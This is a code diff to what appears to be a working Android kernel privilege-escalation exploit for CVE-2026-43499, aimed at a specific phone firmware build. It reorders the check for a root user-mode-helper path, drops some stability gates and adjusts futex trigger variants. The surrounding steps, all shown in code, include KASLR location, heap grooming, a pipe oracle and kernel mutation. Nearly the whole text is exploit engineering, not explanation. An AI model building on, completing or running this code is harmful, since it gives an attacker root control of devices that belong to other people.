@@ -525,7 +525,9 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
 static int do_one_attempt(struct attempt_shared_state *shared,
                            int pselect_delay_usec) {
   (void)pselect_delay_usec;
-  if (!oss_stage_stability_gate("preparing-kernel-access")) return 0;
+  /* Stability is verified once by the C stability launcher before execve.
+   * No redundant in-payload gate here; nothing irreversible runs before this
+   * point. Only the pre-mutation critical-route gate below still re-samples. */
   puts("\x1b[33m[*] \x1b[0mstage=preparing-kernel-access");
 
   raise_rlimit_to_max(RLIMIT_NOFILE);
@@ -539,8 +541,10 @@ static int do_one_attempt(struct attempt_shared_state *shared,
   }
   pin_to_cpu(0);
 
+  /* The gate immediately above already sampled this adjacent read-only setup
+   * three times. Keep the next fresh gate at the actual critical route rather
+   * than paying another six seconds without an intervening allocator phase. */
   /* source: FUN_001044f4 -- puts("stage=locating-kernel"); FUN_0010757c(). */
-  if (!oss_stage_stability_gate("locating-kernel")) return 0;
   puts("\x1b[33m[*] \x1b[0mstage=locating-kernel");
   uint64_t kernel_base = 0;
   uint64_t p0_offset = 0;
@@ -582,6 +586,19 @@ static int do_one_attempt(struct attempt_shared_state *shared,
             "[mode] safe validation set: stopping after KASLR "
             "locate, as designed\n");
     return 1;
+  }
+
+  /* Reject route configuration before four expensive retained grooms and the
+   * pipe oracle. Diagnostic KASLR-only modes above intentionally need no UMH. */
+  const char *root_umh_path = getenv("CVE43499_ROOT_HELPER");
+  if (!root_umh_path || root_umh_path[0] != '/') {
+    fprintf(stderr, "[root_umh] missing CVE43499_ROOT_HELPER\n");
+    return 0;
+  }
+  const char *bisect = getenv("BISECT_VARIANT");
+  if (bisect && strcmp(bisect, "13") == 0) {
+    fprintf(stderr, "[futex] BISECT_VARIANT=13 blocked: no pre-mutation state\n");
+    return 0;
   }
 
   if (!oss_stage_stability_gate("critical-route")) return 0;
@@ -663,12 +680,6 @@ static int do_one_attempt(struct attempt_shared_state *shared,
    * matching ZZHL UMH helper (build/dm3q-S918BXXUAZZHL/
    * cve-2026-43499-root), staged on-device and passed the same way the
    * real app passes CVE43499_ROOT_HELPER. */
-  const char *root_umh_path = getenv("CVE43499_ROOT_HELPER");
-  if (!root_umh_path || root_umh_path[0] != '/') {
-    fprintf(stderr, "[root_umh] missing CVE43499_ROOT_HELPER\n");
-    return 0;
-  }
-
   /* source: run_futex_trigger_v11_{cb,full} (futex_trigger.h/.c) --
    * supersedes v10 in this wiring. v10's own comment claimed the real
    * verify-call gate (G+0x760) "never opens... never written to a
@@ -725,14 +736,8 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     return 0;
   }
 
-  const char *bisect = getenv("BISECT_VARIANT");
   int triggered;
-  if (bisect && strcmp(bisect, "13") == 0) {
-    fprintf(stderr, "[futex] BISECT_VARIANT=13 blocked: no pre-mutation state\n");
-    free(ctx.oracle_snapshots);
-    oss_pipe_rw_reset();
-    return 0;
-  } else if (bisect && strcmp(bisect, "14") == 0) {
+  if (bisect && strcmp(bisect, "14") == 0) {
     triggered = run_futex_trigger_v14_preflight_staged(
         ctx.ghost_task, ctx.initial_lock, &shared->status,
         ATTEMPT_MUTATION_PENDING, ATTEMPT_KERNEL_MUTATED,
